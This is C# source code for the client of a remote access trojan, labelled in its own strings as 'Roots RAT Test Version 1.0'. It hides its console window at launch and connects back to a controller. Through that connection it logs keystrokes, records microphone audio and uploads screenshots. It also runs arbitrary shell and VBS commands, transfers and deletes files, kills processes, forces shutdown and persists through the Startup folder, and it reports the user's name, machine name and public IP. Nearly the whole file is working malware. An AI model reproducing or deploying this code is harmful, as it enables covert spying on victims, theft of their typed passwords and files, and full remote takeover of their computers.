using System;
using System.Management;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Speech.Synthesis;
using Microsoft.VisualBasic.Devices;

namespace ConsoleApp19
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        static void Keys()
        {
            string text = "";

            string path = @"C:\Users\Public\win32.log";

            if (!File.Exists(path))
            {
                var Create = File.Create(path);
                Create.Close();
            }

            KeysConverter converter = new KeysConverter();

            while (true)
            {
                Thread.Sleep(10);

                for (Int32 i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write(text + " ");
                        }

                        break;
                    }
                }
            }
        }

        //start of audio
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        static void Record()
        {
            string mp3Path = @"C:\Users\Public\win64log.mp3";

            if (File.Exists(mp3Path))
            {
                File.Delete(mp3Path);
            }
            record("open new Type waveaudio Alias recsound", "", 0, 0);
            record("record recsound", "", 0, 0);
            Thread.Sleep(5 * 1000);
            record("save recsound c:\\Users\\Public\\win64log.mp3", "", 0, 0);
            record("close recsound", "", 0, 0);
        }
        //end of audio

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        public static void Connect3()
        {
            bool screenshot = false;
            string moveFN = "";
            string dlFN = "";

            IPAddress[] ipAddress = Dns.GetHostAddresses("127.0.0.1");
            IPEndPoint ipEnd = new IPEndPoint(ipAddress[0], 1605);
            Socket clientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

            try
            {
                Console.WriteLine("Connecting! 3");
                clientSock.Connect(ipEnd);
            }
            catch
            {
                Connect3();
            }

            Console.WriteLine("Connected! 3");


            while (0 < 1)
            {
                try
                {
                    byte[] ClientSendData = { 0 };

                    byte[] ClientBuffer = new byte[1024];
                    int ClientData = clientSock.Receive(ClientBuffer);
                    char[] ClientChars = new char[ClientData];

                    System.Text.Decoder ClientDecode = System.Text.Encoding.UTF8.GetDecoder();
                    int ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                    string ClientName = new string(ClientChars);

                    if (ClientName == "sysinfo")
                    {
                        int x64 = 32;
                        string RAM;

                        var CPU = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");

                        bool Architecture = System.Environment.Is64BitOperatingSystem;
                        ComputerInfo PcInfo = new ComputerInfo();

                        ulong mem = ulong.Parse(PcInfo.TotalPhysicalMemory.ToString());

                        if (Architecture == true)
                        {
                            x64 = 64;
                        }

                        RAM = "RAM amount : " + ((mem / (1024 * 1024)).ToString()) + "mb(s)\r\nCPU architecture: " + x64 + "-bit\r\nCPU info: " + CPU + "\r\n";


                        string monitors = "";
                        int count = 0;

                        foreach (var screen in System.Windows.Forms.Screen.AllScreens)
                        {
                            if (count == 0)
                            {
                                monitors = "Main monitor: " + count;
                                count++;
                            }
                            else
                            {
                                monitors = monitors + "\r\nOther monitor: " + count;
                                count++;
                            }
                        }

                        ClientSendData = Encoding.ASCII.GetBytes(RAM + monitors + "\r\n");
                    }
                    else if (ClientName.Contains("speak "))
                    {
                        ClientName = ClientName.Replace("speak ", "");
                        SpeechSynthesizer synth = new SpeechSynthesizer();
                        synth.SetOutputToDefaultAudioDevice();

                        if (ClientName == null)
                        {
                            ClientSendData = System.Text.Encoding.ASCII.GetBytes("Input is null!\r\n");
                        }
                        else
                        {
                            ClientSendData = System.Text.Encoding.ASCII.GetBytes("Input has been turned to speech!\r\n");
                            synth.Speak(ClientName);
                        }
                    }
                    else if (ClientName == "shutdown")
                    {
                        Process Cmd = new Process();
                        Cmd.StartInfo.FileName = "cmd.exe";
                        Cmd.StartInfo.RedirectStandardInput = true;
                        Cmd.StartInfo.RedirectStandardOutput = true;
                        Cmd.StartInfo.CreateNoWindow = true;
                        Cmd.StartInfo.UseShellExecute = false;
                        Cmd.Start();

                        Cmd.StandardInput.WriteLine("shutdown -t 4 -s -f");
                        Cmd.StandardInput.Flush();
                        Cmd.StandardInput.Close();
                        Cmd.WaitForExit();

                        ClientSendData = System.Text.Encoding.ASCII.GetBytes("Shutting down remote machine in 4 secounds!\r\n");
                    }
                    else if (ClientName.Contains("screenshot "))
                    {
                        ClientName = ClientName.Replace("screenshot ", "");
                        int count = Convert.ToInt32(ClientName);
                        System.Drawing.Image Desktop = GrabDesktop(count);

                        if (File.Exists("winlog.png"))
                        {
                            File.Delete("winlog.png");
                        }

                        Desktop.Save("winlog.png");
                        string screenshotOutput = "Screenshot of monitor " + count + " saved to " + Environment.CurrentDirectory + "!\r\n";

                        ClientSendData = System.Text.Encoding.ASCII.GetBytes(screenshotOutput);
                        clientSock.Send(ClientSendData);

                        //send file
                        Thread.Sleep(1000);

                        if (File.Exists(Environment.CurrentDirectory + @"\winlog.png"))
                        {
                            string fileName = "winlog.png";
                            string filePath = Environment.CurrentDirectory + @"\";

                            if (File.Exists(filePath + fileName))
                            {
                                byte[] fileNameByte = Encoding.ASCII.GetBytes(fileName);

                                byte[] fileData = File.ReadAllBytes(filePath + fileName);
                                byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
                                byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);

                                fileNameLen.CopyTo(clientData, 0);
                                fileNameByte.CopyTo(clientData, 4);
                                fileData.CopyTo(clientData, 4 + fileNameByte.Length);

                                clientSock.Send(clientData);
                            }
                        }

                        screenshot = true;

                        File.Delete(Environment.CurrentDirectory + @"\winlog.png");
                    }
                    else if (ClientName == "log keys")
                    {
                        Task.Factory.StartNew(Keys);
                        ClientSendData = System.Text.Encoding.ASCII.GetBytes("Client's keyboard is now being logged!\r\n");
                    }
                    else if (ClientName == "recover log")
                    {
                        string logData = "";

                        if (File.Exists(@"C:\Users\Public\win32.log"))
                        {
                            string keylog = File.ReadAllText(@"C:\Users\Public\win32.log");
                            logData = "Log data: \r\n" + keylog + "\r\n";
                        }
                        else
                        {
                            logData = "Log data failed to be retrieved\r\n";
                        }

                        ClientSendData = System.Text.Encoding.ASCII.GetBytes(logData);
                    }
                    else if (ClientName.Contains("end process "))
                    {
                        string endProcess = "";
                        ClientName = ClientName.Replace("end process ", "");

                        try
                        {
                            int id = Convert.ToInt32(ClientName);
                            Process process = Process.GetProcessById(id);
                            process.Kill();
                            endProcess = "Killed process " + ClientName;
                        }
                        catch (Exception e)
                        {
                            endProcess = "Couldn't kill process " + ClientName + "\r\n" + e.ToString();
                        }

                        ClientSendData = System.Text.Encoding.ASCII.GetBytes(endProcess);
                    }
                    else if (ClientName == "processesMB")
                    {
                        string proc = "";

                        Process[] processes = Process.GetProcesses();

                        foreach (Process process in processes)
                        {
                            proc = proc + "Name: " + process.ProcessName + " \r\n" + "Id: " + process.Id + "\r\n \r\n";
                        }

                        ClientSendData = System.Text.Encoding.ASCII.GetBytes(proc);
                    }
                    else if (ClientName.Contains("get process info "))
                    {
                        string proc = "Error in retrieving information!\r\n";

                        ClientName = ClientName.Replace("get process info ", "");
                        int id = Convert.ToInt32(ClientName);

                        Process[] processes = Process.GetProcesses();
                        foreach (var process in processes)
                        {
                            if (process.Id == id)
                            {
                                proc = ""; 
                                int Mbsize = 0;

                                PerformanceCounter ramCounter = new PerformanceCounter("Process", "Working Set", process.ProcessName);
                                PerformanceCounter cpuCounter = new PerformanceCounter("Process", "% Processor Time", process.ProcessName);

                                Mbsize = Convert.ToInt32(ramCounter.NextValue()) / (1024 * 1024);

                                int i = 0;
                                while (i < 5)
                                {
                                    Console.WriteLine(cpuCounter.NextValue() + " %");
                                    Thread.Sleep(1000);
                                    i++;
                                }

                                proc = "Process: " + process.ProcessName + "\r\n" + "CPU usage: " + cpuCounter.NextValue() + " % \r\nRAM usage: " + Mbsize + " mb(s)\r\n";

                                ramCounter.Close();
                                ramCounter.Dispose();
                            }
                        }

                        ClientSendData = System.Text.Encoding.ASCII.GetBytes(proc);
                    }
                    else if (ClientName == "check audio")
                    {
                        string audioStatus = "";
                        if (File.Exists(@"C:\Users\Public\win64log.mp3"))
                        {
                            audioStatus = "Audio file exists!\r\n";
                        }
                        else
                        {
                            audioStatus = "Audio file doesn't exist!\r\n";
                        }

                        ClientSendData = System.Text.Encoding.ASCII.GetBytes(audioStatus);
                    }
                    else if (ClientName.Contains("del "))
                    {
                        string delInfo = "";
                        ClientName = ClientName.Replace("del ", "");

                        if (File.Exists(ClientName))
                        {
                            try
                            {
                                File.Delete(ClientName);
                                if (!File.Exists(ClientName))
                                {
                                    delInfo = "File has been deleted successfully!\r\n";
                                }
                            }
                            catch (Exception e)
                            {
                                delInfo = "Failed to delete file! \r\n" + e + "\r\n";
                            }
                        }
                        else
                        {
                            delInfo = "File doesn't exist!\r\n";
                        }
                    }
                    else if (ClientName == "copy to startup")
                    {
                        string copyToStart = "";

                        Process proccess = Process.GetCurrentProcess();
                        string procString = proccess.ToString();
                        procString = procString.Replace("System.Diagnostics.Process (", "");
                        procString = procString.Replace(")", "");
                        string currentProc = Environment.CurrentDirectory + @"\" + procString + ".exe";
                        File.Move(currentProc, @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\App.exe");

                        if (File.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\App.exe"))
                        {
                            copyToStart = "File successfully copied to startup!\r\n";
                        }
                        else
                        {
                            copyToStart = "File unsuccesfully copied to startup!\r\n";
                        }

                        ClientSendData = System.Text.Encoding.ASCII.GetBytes(copyToStart);
                    }
                    else if (ClientName == "audio record")
                    {
                        Task.Factory.StartNew(Record);
                        ClientSendData = System.Text.Encoding.ASCII.GetBytes(@"Recording audio for the next five minutes!\r\nMp3 saved to: C:\Users\" + Environment.UserName + @"\winlog64.mp3\r\n");
                    }
                    else if (ClientName.Contains("ls "))
                    {
                        string ls = "";

                        ClientName = ClientName.Replace("ls ", "");
                        if (Directory.Exists(ClientName))
                        {
                            try
                            {
                                string[] allfiles = Directory.GetFiles(ClientName);
                                string[] alldirs = Directory.GetDirectories(ClientName);

                                ls = "Files in: " + ClientName + "\r\n";

                                foreach (var file in allfiles)
                                {
                                    FileInfo info = new FileInfo(file);
                                    long lenght = new FileInfo(file).Length;
                                    long kbLenght = lenght / 1024;
                                    ls = ls + info + ", " + kbLenght + " kb(s)\r\n";
                                }

                                ls = ls + "\r\nDirectories in: " + ClientName + "\r\n";

                                foreach (var dirs in alldirs)
                                {
                                    DirectoryInfo info = new DirectoryInfo(dirs);
                                    ls = ls + info + " \r\n";
                                }
                            }
                            catch (Exception e)
                            {
                                ls = "Error in retreiving directory info! \r\n" + e;
                            }
                        }
                        else
                        {
                            ls = "Directory does not exist!";
                        }

                        ClientSendData = Encoding.ASCII.GetBytes(ls);
                    }
                    else if (ClientName.Contains("dlFN "))
                    {
                        ClientName = ClientName.Replace("dlFN ", "");
                        dlFN = ClientName;

                        ClientSendData = Encoding.ASCII.GetBytes("Download filename has been set!\r\n");
                    }
                    else if (ClientName.Contains("dl "))
                    {
                        ClientName = ClientName.Replace("dl ", "");
                        ClientSendData = Encoding.ASCII.GetBytes("Client sending filename!\r\n");
                        clientSock.Send(ClientSendData);

                        if (File.Exists(ClientName + dlFN))
                        {
                            string fileName = dlFN;
                            string filePath = ClientName;

                            if (File.Exists(filePath + fileName))
                            {
                                byte[] fileNameByte = Encoding.ASCII.GetBytes(fileName);
                                byte[] fileData = File.ReadAllBytes(filePath + fileName);
                                byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
                                byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);

                                fileNameLen.CopyTo(clientData, 0);
                                fileNameByte.CopyTo(clientData, 4);
                                fileData.CopyTo(clientData, 4 + fileNameByte.Length);
                                clientSock.Send(clientData);
                            }
                        }
                    }
                    else if (ClientName.Contains("move "))
                    {
                        ClientName = ClientName.Replace("move ", "");

                        try
                        {
                            File.Move(ClientName, moveFN);
                            ClientSendData = Encoding.ASCII.GetBytes("Moved file!\r\n");
                        }
                        catch (Exception e)
                        {
                            ClientSendData = Encoding.ASCII.GetBytes("Failed to move file!\r\n" + e + "\r\n");
                        }
                    }
                    else if (ClientName.Contains("moveFN "))
                    {
                        ClientName = ClientName.Replace("moveFN ", "");
                        moveFN = ClientName;

                        ClientSendData = Encoding.ASCII.GetBytes("Move filename has been set to " + moveFN + "\r\n");
                    }
                    else if (ClientName.Contains("start "))
                    {
                        string start;

                        ClientName = ClientName.Replace("start ", "");
                        if (File.Exists(ClientName))
                        {
                            try
                            {
                                Process.Start(ClientName);
                                start = "Opened file succesfully!\r\n";
                            }
                            catch
                            {
                                start = "File opening was not successfull!\r\n";
                            }
                        }
                        else
                        {
                            start = "File " + ClientName + " doesn't exists!\r\n";
                        }

                        ClientSendData = Encoding.ASCII.GetBytes(start);
                    }
                    else if (ClientName == "users")
                    {
                        string users = "";
                        string[] alldirs = Directory.GetDirectories(@"C:\Users");
                        users = "Users on remote machine:\r\n";

                        foreach (var dirs in alldirs)
                        {
                            DirectoryInfo info = new DirectoryInfo(dirs);
                            users = users + info + "\r\n";
                        }

                        users = users.Replace(@"C:\Users\", "");

                        ClientSendData = Encoding.ASCII.GetBytes(users);
                    }
                    else if (ClientName == "drives")
                    {
                        string drivesText = "";
                        DriveInfo[] drives = DriveInfo.GetDrives();

                        foreach (DriveInfo d in drives)
                        {
                            string name = "Drive name : " + d.Name + " \r\nDrive size : " + d.TotalSize / (1024 * 1024 * 1024) + " gb(s)\r\nAvailable Storage : " + d.TotalFreeSpace / (1024 * 1024 * 1024) + " Gb(s)\r\n";
                            drivesText = drivesText + name;
                        }

                        ClientSendData = Encoding.ASCII.GetBytes(drivesText);
                    }
                    else if (ClientName == "!log keys")
                    {
                        ClientSendData = System.Text.Encoding.ASCII.GetBytes("Client had already executed key logger! \r\n");
                    }
                    else if (ClientName.Contains("send "))
                    {
                        ClientSendData = System.Text.Encoding.ASCII.GetBytes("Client receiving file!\r\n");
                        clientSock.Send(ClientSendData);

                        byte[] clientData = new byte[1024 * 5000];
                        string receivedPath = @"C:\Users\" + Environment.UserName + @"\";

                        int receivedBytesLen = clientSock.Receive(clientData);

                        int fileNameLen = BitConverter.ToInt32(clientData, 0);
                        string fileName = Encoding.ASCII.GetString(clientData, 4, fileNameLen);

                        BinaryWriter bWrite = new BinaryWriter(File.Open(receivedPath + fileName, FileMode.Append));
                        bWrite.Write(clientData, 4 + fileNameLen, receivedBytesLen - 4 - fileNameLen);
                        bWrite.Close();
                    }
                    else if (ClientName.Contains("sendFN "))
                    {
                        ClientSendData = System.Text.Encoding.ASCII.GetBytes("Filename has been set!\r\n");
                    }
                    else
                    {
                        ClientSendData = Encoding.ASCII.GetBytes("Unknown command!\r\n");
                    }

                    if (screenshot == false)
                    {
                        clientSock.Send(ClientSendData);
                    }
                    else
                    {
                        screenshot = false;
                    }
                }
                catch
                {
                    Connect3();
                }
            }
        }

        private static System.Drawing.Image GrabDesktop(int monitor)
        {
            System.Windows.Forms.Screen[] screens = System.Windows.Forms.Screen.AllScreens;
            Rectangle bounds = screens[monitor].Bounds;

            BinaryFormatter binFormatter = new BinaryFormatter();
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graphic = Graphics.FromImage(screenshot);
            graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }

        public static void Connect2()
        {
            IPAddress[] ipAddress = Dns.GetHostAddresses("127.0.0.1");
            IPEndPoint ipEnd = new IPEndPoint(ipAddress[0], 1606);
            Socket clientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

            try
            {
                Console.WriteLine("Connecting! 2");
                clientSock.Connect(ipEnd);
            }
            catch
            {
                Connect2();
            }

            IPAddress address = ((IPEndPoint)clientSock.RemoteEndPoint).Address;

            Console.WriteLine(address);
            Console.WriteLine("Connected! 2");

            while (0 < 1)
            {
                bool speak = false;
                bool executeVBS = false;
                bool Link = false;

                try
                {
                    string CmdOutput = "";

                    byte[] ClientBuffer = new byte[1024];
                    int ClientData = clientSock.Receive(ClientBuffer);
                    char[] ClientChars = new char[ClientData];

                    System.Text.Decoder ClientDecode = System.Text.Encoding.UTF8.GetDecoder();
                    int ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                    string ClientName = new string(ClientChars);

                    if (ClientName.Contains("miscCMD:VBS:"))
                    {
                        ClientName = ClientName.Replace("miscCMD:VBS:", "");

                        string path = @"C:\Users\Public\vbsCMD.vbs";

                        ClientName = ClientName.Replace("VBS:", "");

                        if (File.Exists(path)) //check file; so that it doesnt fuck
                        {
                            File.Delete(path);
                            var Create = File.Create(path);
                            Create.Close();
                        }

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            CmdOutput = "Error!";

                            try
                            {
                                sw.WriteLine(ClientName);
                                CmdOutput = "Vbs script has created, it will be executed in 3 secounds!";
                            }
                            catch
                            {

                            }

                            executeVBS = true;
                        }
                    }
                    else if (ClientName.Contains("speak:"))
                    {
                        ClientName = ClientName.Replace("speak:", "");
                        CmdOutput = "Input will be turned into speech in 3 secounds!";

                        speak = true;
                    }
                    else if (ClientName == "hide:window")
                    {
                        var handle = GetConsoleWindow();
                        ShowWindow(handle, 0);

                        Thread.Sleep(10);
                    }
                    else if (ClientName == "show:window")
                    {
                        var handle = GetConsoleWindow();
                        ShowWindow(handle, 5);

                        Thread.Sleep(10);
                    }
                    else if (ClientName == "shutdown")
                    {
                        Process Cmd = new Process();
                        Cmd.StartInfo.FileName = "cmd.exe";
                        Cmd.StartInfo.RedirectStandardInput = true;
                        Cmd.StartInfo.RedirectStandardOutput = true;
                        Cmd.StartInfo.CreateNoWindow = true;
                        Cmd.StartInfo.UseShellExecute = false;
                        Cmd.Start();

                        Cmd.StandardInput.WriteLine("shutdown -t 3 -s -f");
                        Cmd.StandardInput.Flush();
                        Cmd.StandardInput.Close();
                        Cmd.WaitForExit();

                        CmdOutput = "Shutting down remote machine in 3 secounds!";
                    }
                    else if (ClientName.Contains("link:"))
                    {
                        ClientName = ClientName.Replace("link:", "");

                        CmdOutput = "Opening link in 3 secounds!";
                        Link = true;
                    }
                    else if (ClientName == "disconnect")
                    {
                        byte[] ClientSendData2 = System.Text.Encoding.ASCII.GetBytes("Client is disconnecting in 3 secounds!");
                        clientSock.Send(ClientSendData2);

                        Thread.Sleep(3000);
                        Environment.Exit(1);
                    }
                    else
                    {
                        try
                        {
                            Console.WriteLine(ClientName);

                            Process Cmd = new Process();
                            Cmd.StartInfo.FileName = "cmd.exe";
                            Cmd.StartInfo.RedirectStandardInput = true;
                            Cmd.StartInfo.RedirectStandardOutput = true;
                            Cmd.StartInfo.CreateNoWindow = true;
                            Cmd.StartInfo.UseShellExecute = false;
                            Cmd.Start();

                            Cmd.StandardInput.WriteLine(ClientName);
                            Cmd.StandardInput.Flush();
                            Cmd.StandardInput.Close();
                            Cmd.WaitForExit();

                            CmdOutput = Cmd.StandardOutput.ReadToEnd();
                        }
                        catch (Exception e)
                        {
                            CmdOutput = e + "";
                        }
                    }

                    byte[] ClientSendData = System.Text.Encoding.ASCII.GetBytes(CmdOutput);
                    clientSock.Send(ClientSendData);

                    if (executeVBS == true)
                    {
                        Thread.Sleep(3000);
                        Process.Start(@"C:\Users\Public\vbsCMD.vbs");
                        executeVBS = false;
                    }
                    else if (speak == true)
                    {
                        Thread.Sleep(3000);

                        SpeechSynthesizer synth = new SpeechSynthesizer();
                        synth.SetOutputToDefaultAudioDevice();
                        synth.Speak(ClientName);

                        speak = false;
                    }
                    else if (Link == true)
                    {
                        Thread.Sleep(3000);
                        Process.Start("http://" + ClientName);
                        Link = false;
                    }
                    else
                    {
                        Thread.Sleep(10);
                    }
                }
                catch
                {

                    Connect2();
                }
            }
        }

        public static void Connect()
        {
            ComputerInfo PcInfo = new ComputerInfo();
            ulong mem = ulong.Parse(PcInfo.TotalPhysicalMemory.ToString());
            var ramCounter = new PerformanceCounter("Memory", "Available MBytes");
            var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");

            string version = "1.0";
            byte[] ClientData;

            IPAddress[] ipAddress = Dns.GetHostAddresses("127.0.0.1");
            IPEndPoint ipEnd = new IPEndPoint(ipAddress[0], 1604);
            Socket clientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

            try
            {
                Console.WriteLine("Connecting! 1");
                clientSock.Connect(ipEnd);
            }
            catch
            {
                Connect();
            }

            Console.WriteLine("Connected! 1");

            try
            {
                //username
                ClientData = System.Text.Encoding.ASCII.GetBytes(Environment.UserName);
                clientSock.Send(ClientData);
                //username

                Thread.Sleep(200);

                //version
                ClientData = System.Text.Encoding.ASCII.GetBytes("version:" + version);
                clientSock.Send(ClientData);
                //version

                Thread.Sleep(200);

                //note
                ClientData = System.Text.Encoding.ASCII.GetBytes("note:Roots RAT Test Version 1.0");
                clientSock.Send(ClientData);
                //note

                Thread.Sleep(200);

                //machine
                ClientData = System.Text.Encoding.ASCII.GetBytes("machine:" + Environment.MachineName);
                clientSock.Send(ClientData);
                //machine

                Thread.Sleep(200);

                //ip addr
                WebClient browser = new WebClient();
                string IP = browser.DownloadString(@"http://icanhazip.com");
                ClientData = System.Text.Encoding.ASCII.GetBytes(IP);


                clientSock.Send(ClientData);
                //ip addr

                Thread.Sleep(200);

                //keylog
                byte[] ClientBuffer5 = new byte[1024];
                int ClientData5 = clientSock.Receive(ClientBuffer5);
                char[] ClientChars5 = new char[ClientData5];

                System.Text.Decoder ClientDecode5 = System.Text.Encoding.UTF8.GetDecoder();
                int ClientCharLen = ClientDecode5.GetChars(ClientBuffer5, 0, ClientData5, ClientChars5, 0);
                string ClientName = new string(ClientChars5);

                if (ClientName == "keylog = true")
                {
                    Task.Factory.StartNew(Keys);
                }

                ClientData5 = clientSock.Receive(ClientBuffer5);
                ClientChars5 = new char[ClientData5];

                ClientCharLen = ClientDecode5.GetChars(ClientBuffer5, 0, ClientData5, ClientChars5, 0);
                ClientName = new string(ClientChars5);

                if (ClientName == "startup = true")
                {
                    Process proccess = Process.GetCurrentProcess();
                    string procString = proccess.ToString();
                    procString = procString.Replace("System.Diagnostics.Process (", "");
                    procString = procString.Replace(")", "");
                    string currentProc = Environment.CurrentDirectory + @"\" + procString + ".exe";
                    File.Move(currentProc, @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\App.exe");
                }
                //keylog

                Thread.Sleep(200);

                //benchmark
                ClientData = System.Text.Encoding.ASCII.GetBytes("cpu:Benchmarking");
                clientSock.Send(ClientData);

                Thread.Sleep(200);

                ClientData = System.Text.Encoding.ASCII.GetBytes("ram:Benchmarking");
                clientSock.Send(ClientData);
                //benchmark

                int i = 0;
                while (i < 5)
                {
                    Console.WriteLine(cpuCounter.NextValue() + " %");
                    Thread.Sleep(1000);
                    i++;
                }
            }
            catch
            {
                Connect();
            }

            while (0 < 1)
            {
                try
                {
                    ClientData = System.Text.Encoding.ASCII.GetBytes("cpu:" + cpuCounter.NextValue() + " %");
                    clientSock.Send(ClientData);
                    Thread.Sleep(1000);

                    Console.WriteLine("ram:" + ((mem / (1024 * 1024)) - ramCounter.NextValue()) + " mb(s) / " + ((mem / (1024 * 1024)).ToString()) + " mb(s)");
                    byte[] ClientData2 = System.Text.Encoding.ASCII.GetBytes("ram:" + ((mem / (1024 * 1024)) - ramCounter.NextValue()) + " mb(s) / " + ((mem / (1024 * 1024)).ToString()) + " mb(s)");
                    clientSock.Send(ClientData2);
                    Thread.Sleep(1000);

                    int chars = 256;
                    StringBuilder buff = new StringBuilder(chars);
                    IntPtr handle = GetForegroundWindow();
                    if (GetWindowText(handle, buff, chars) > 0)
                    {
                        ClientData = System.Text.Encoding.ASCII.GetBytes(buff.ToString());
                        clientSock.Send(ClientData);
                    }
                    Thread.Sleep(1000);
                }
                catch
                {
                    Connect();
                }
            }
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);

            Task.Factory.StartNew(Connect);
            Task.Factory.StartNew(Connect2);

            Connect3();
        }
    }
}
